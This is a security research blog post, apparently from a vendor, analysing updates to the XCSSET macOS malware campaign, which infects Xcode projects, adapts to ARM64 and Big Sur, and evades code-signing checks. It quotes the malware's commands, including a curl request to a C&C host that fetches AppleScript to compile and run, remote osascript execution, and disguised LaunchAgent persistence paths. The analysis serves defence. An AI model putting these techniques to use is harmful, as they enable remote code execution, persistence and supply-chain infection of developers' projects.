	<p class="article-details__description">This latest update details our new research on XCSSET, including the ways in which it has adapted itself to work on both ARM64 and x86_x64 Macs.</p>

		<div>
			<p>Last year, we first found XCSSET, which targeted Mac users by infecting Xcode projects. Initially reported as a malware family, in light of our recent findings it is now classified as an ongoing campaign.  This latest update details our new research regarding XCSSET, including the ways in which it has adapted itself to work on both ARM64 and x86_x64 Macs, as well as other notable payload changes.</p>
<p>In our <a href="/en_us/research/20/h/xcsset-mac-malware--infects-xcode-projects--uses-0-days.html">first blog post</a> and <a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf">technical brief on XCSSET</a>, we discussed at length the dangers it posed to Xcode developers and how it exploited two macOS vulnerabilities to maximize what it can take from an infected machine. Our <a href="https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief_Followup.pdf">follow-up update</a> covered the <a href="/en_us/research/20/i/xcsset-update-browser-debug-modes-inactive-ransomware.html">third exploit</a> we found that takes advantage of other popular browsers in macOS to implant a Universal Cross-site Scripting (UXSS) injection.</p>
<p><b style=""><span class="body-subhead-title">Big changes for macOS 11 Big Sur</span></b><br />
</p>
<p>Last November, Apple released its operating system Big Sur alongside new Mac products equipped with ARM-based M1 processors. Software with x86_64 architecture can still run on macOS 11 with the help of Rosetta 2, an emulator built into Big Sur, but most software developers may prefer to update their software so it can support ARM64.</p>
<p>According to <a href="https://securelist.com/malware-for-the-new-apple-silicon-platform/101137/" target="_blank">Kaspersky</a>, new samples from the malware were discovered that can run on Macs with the new M1 chip. We checked the binary files downloaded from the command and control (C&amp;C) server and discovered that nearly all of them were files containing both x86_x64 and ARM64 architectures, save for three that only had an x86_64 architecture. Besides adding support for the M1 chip, XCSSET malware has taken other actions to fit macOS 11 Big Sur as well.</p>
<p>As mentioned in our first technical brief, this malware leverages the development version of Safari to load malicious Safari frameworks and related JavaScript backdoors from its C&amp;C server. It hosts Safari update packages in the C&amp;C server, then downloads and installs packages for the user’s OS version. To adapt to the newly-released Big Sur, new packages for “Safari 14” were added (Figure 1). As we’ve observed in <i>safari_remote.applescript</i>, it downloads a corresponding Safari package according to the user’s current browser and OS versions (Figure 2). </p>

<p>The malware's latest modules, such as the new <i>icons.php</i> module introduces changes to the icons to fit their victim's OS (Figure 5). For example, a fake Finder's icon for macOS versions 10.15 and lower has a downloaded icon file named <i>Finder.icns</i> with square corners (Figure 3), whereas macOS 11.1 has a downloaded icon file named <i>FinderBigSur.icns</i> and has an icon with rounded corners (Figure 4) to mimic the ones used in Big Sur.</p>

		<div>
			<h2><b><span class="body-subhead-title">Getting past macOS 11’s security features</span></b></h2>
<p>The beta 6 version of macOS Big Sur 11 onwards does include new security requirements to better detect any code modifications. Executables must now be signed before they are allowed to run, though a simple ad-hoc signature will suffice. However, this doesn't apply to translated x86 binaries that run under Rosetta 2, nor a macOS 11 that runs on an Intel-based platform.</p>
<p>In all AppleScript modules, instead of the <i style="">open</i> command a new <i style="">launchApp</i> function is used to execute a fake app made from malicious AppleScript (Figure 6).</p>

		</div>
	

</div>

    <div class="richText">
	
    


	
		<div>
			<p>But as we have seen from its source code, the malware can cleverly circumvent macOS 11's new security policies: Its fake apps and files are codesigned with an ad-hoc signature using the codesign --force --deep -s - command. The malware then downloads its own open tool from its C&amp;C server that comes pre-signed with an ad-hoc signature, whereas if it were on macOS versions 10.15 and lower, it would still use the system's built-in open command to run the apps.</p>
<p>The main routine of the open tool is as follows:</p>
<ul>
<li><span class="rte-red-bullet">Require an app bundle as argument.  For example: <i>open xcode.app</i></span></li>
<li><span class="rte-red-bullet">Launch the <i>{app bundle}\Contents\macOS\applet</i></span></li>
<li><span class="rte-red-bullet">Check if the <i>wait</i> parameter is included, For example: <i>open xcode.app wait</i></span></li>
<li><span class="rte-red-bullet">Launch the <i>{app bundle}\Contents\macOS\applet</i></span></li>
<li><span class="rte-red-bullet">Continuously check if the target app is included in the running process using the following commands: <i>/bin/bash -c ps aux | grep -v grep | grep -ci '{app bundle}/Contents/macOS/applet' || echo 0 2&gt;&amp;1      &amp;&gt;/dev/null</i> </span></li>
</ul>
<p>Interestingly, even though the <i style="">/usr/bin/open</i> command works fine for fake apps on M1 systems, it still uses its own <i style="">open</i> tool.<br />
</p>

<h2><b style=""><i><span class="body-subhead-title">bootstrap.applescript</span></i></b></h2>
<p>The bootstrap.applescript module, which is called by binary Pods and contains the logic to call other malicious AppleScript modules, has also undergone some noteworthy changes:</p>
<ul>
<li><span class="rte-red-bullet">Machines with the username &quot;apple_mac,&quot; identified as physical machines with the M1 chip, are then used to test if new Mach-O files with ARM architecture can work properly on M1 machines (Figure 8)</span></li>
<li><span class="rte-red-bullet">Calls a new <i>screen_sim</i> module instead of a <i>screen</i> module (Figure 9)</span></li>
<li><span class="rte-red-bullet">Added support for Chromium browser (Figure 10)</span></li>
<li><span class="rte-red-bullet">In its previous version, we observed that the chrome_data and opera_data modules were only called when the language contains &quot;IN&quot; for India (Figure 11), but in this latest iteration the <i>chrome_data</i> module is called along with the <i>replicator</i> module. In addition, the call for <i>opera_data</i> has been commented out (Figure 12)</span></li>
</ul>

		<div>
			<p><b><i><span class="body-subhead-title">replicator.applescript</span></i></b></p>
<p>The replicator.applescript module is responsible for injecting local Xcode projects with malicious code. We’ve observed that this module uses more varied file names in this latest version compared to its predecessor. The new file names used by this module are as follows:</p>
<p>Script file names:</p>
<ul>
<li><span class="rte-red-bullet">Assets.xcassets</span></li>
<li><span class="rte-red-bullet">Asset.xcasset</span></li>
<li><span class="rte-red-bullet">xcassets.folder</span></li>
<li><span class="rte-red-bullet">build.file</span></li>
</ul>
<p>Mach-O file name:<br />
</p>
<ul>
<li><span class="rte-red-bullet"></span>cat</li>
</ul>
<p>The replicator.applescript module infects Xcode developer projects by inserting a function that calls its malicious components during the build phase or the build rule. In previous versions, these code snippets inserted in the build phase or build rule were assigned hard-coded IDs, but this latest iteration added a new function that automatically generates random IDs. According to its logic (Figure 13), this random ID will always end with the postfix “AAC43A,” which is used to identify and remove the old infection snippet in preparation for a new infection (Figure 14). We were able to locate 10 public GitHub repositories infected with this malware, but these all had old hard-coded IDs.  Repositories infected with the latest variant have yet to be found.<br />
</p>
<p>Originally, the inserted script during the build phase or build rule calls a bash script file, which refers to Mach-O binary files as “Pods” (Figure 15). However, in this latest version, the script calls a Mach-O binary file “cat” directly and is assigned the value of the AUTO_CLEAN_PROJ variable, which is currently set to “false” (Figure 16).</p>

		<div>
			<p><b><span class="body-subhead-title">New Findings on the Landing Mach-O File</span></b></p>
<p>As previously discussed, we have found that nearly all the binary files that were downloaded directly from the C&amp;C server have changed from Mach-O files with an x86_64 architecture to universal binary files with both x86_64 and ARM64 architectures, with three notable exceptions: “cat” and “Pods” are landing Mach-O binary files triggered by infected Xcode projects, while “open” is used to execute all fake apps compiled from malicious AppleScript script files. Upon further investigation, we’ve come across new findings as to why these were not updated to support ARM64:  </p>
<p>The <i>cat</i> Mach-O binary file is generated by the Shell Script Compiler (shc), an open-source tool used to generate a local executable binary file from an input shell script file. Users can find its source code from GitHub and easily install it using local package management tools like Homebrew for macOS, or Yellowdog Updater Modified (YUM) and apt-get for Linux. Although there is a tool called UnShc that can decompile binary files generated by shc, it doesn’t work well for files from the latest version of shc.</p>
<p>Because of this, we still had to examine the payload from <i>cat</i> using proper debugging methods: First, we got a decrypted shell script from <i>cat</i>, whose main payload is downloading and executing other Mach-O binary <i>Pods</i> from the C&amp;C server (Figure 19).  <i>Pods</i>, likewise generated by shc, has the same file size as <i>cat</i>. We used the same debugging methods to procure a decrypted shell script from it.</p>

		</div>
	

</div>

		<div>
			<p>Once decrypted, the shell script from <i>Pods</i> were shown to be quite complicated and able to:</p>
<ol>
<li>1Connect to <i>https://$TARGET_DOMAIN/apple/prepod.php</i> in an attempt to get remote command. The expected return result is AppleScript string. If the return result doesn’t come up empty, <i>osascript -e</i> is called to execute it. So far, the return result has been empty.</li>
<li>Read <i>$HOME/Library/Caches/GameKit/.report</i>, and if this file exists, use its contents as the target directory. Otherwise, it randomly selects a path from the following:<ul>
<li><span class="rte-red-bullet"><i style="">&quot;$HOME/Library/Application Support/iCloud&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Application Scripts/com.apple.AddressBook.Shared&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Group Containers/group.com.apple.notes&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Containers/com.apple.routerd&quot;</i></span></li>
</ul>
</li>
<li>Read <i style="">$HOME/Library/Caches/GameKit/.plist</i>, and if this file exists, use its contents as the path for a plist file of a persistent item. Otherwise, it randomly selects a path from the following:<br />
<ul>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/LaunchAgents/com.apple.net.core.plist&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/LaunchAgents/com.apple.auditor.plist&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/LaunchAgents/com.google.keystone.plist&quot; </i></span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/LaunchAgents/com.google.keystone.plist&quot;</i></span></li>
</ul>
</li>
<li>Use macOS’s <i style="">osacompile</i> command to compile embedded AppleScript (Figure 20) to acquire a fake Xcode.app. The embedded AppleScript contains some encrypted string, making it difficult to read. But after decrypting, we discovered its main payload:<br />
<ol>
<li>Send an http request to com.php by executing a command: <i style="">curl -sk -d 'user=&lt;username&gt;&amp;build_vendor=default&amp;build_version=default' https://&lt;domainname&gt;/apple/com.php. </i>As a result, it obtains a new AppleScript file’s content. Based on this, we believe it to be bootstrap.applescript.</li>
<li>Use the <i style="">osacompile -x</i> command to compile the AppleScript content from the curl command to a run-only AppleScript, then execute it.<br />
</li>
</ol>
</li>
<li>Create the file <i style="">$HOME/Library/Caches/GameKit/AppleKit</i> and write the path of Xcode.app’s main Mach-O file (<i style="">Contents/macOS/applet</i>) into it.<br />
</li>
<li>Create the file <i style="">$TARGET_PLIST_FILE</i> that launches <i style="">$HOME/Library/Caches/GameKit/AppleKit</i>. Then it calls the <i style="">launchctl load</i> command to load the plist file, so the AppleKit file is executed, and in turn, execute the fake Xcode.app.<br />
</li>
<li>Write the following files: <br />
<ul>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Caches/GameKit/.report&quot; – “$TARGETDIR/Xcode.app”</i> compiled by malware</span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Caches/GameKit/.plist&quot; – “$TARGET_PLIST_FILE”</i> persistence created by malware</span></li>
<li><span class="rte-red-bullet"><i>&quot;$HOME/Library/Caches/GameKit/.domain&quot;</i> - domain used by malware</span></li>
</ul>
</li>
<li>Finally, an interesting function in the shell script is <i>clean_proj</i> (Figure 21), which is used to disinfect the current infected Xcode project. The calling condition of <i>clean_proj</i> is <i>“$AUTOCLEAN=true”</i>(Figure 22), but as mentioned earlier, currently the variable’s value is false.</li>
</ol>

		</div>
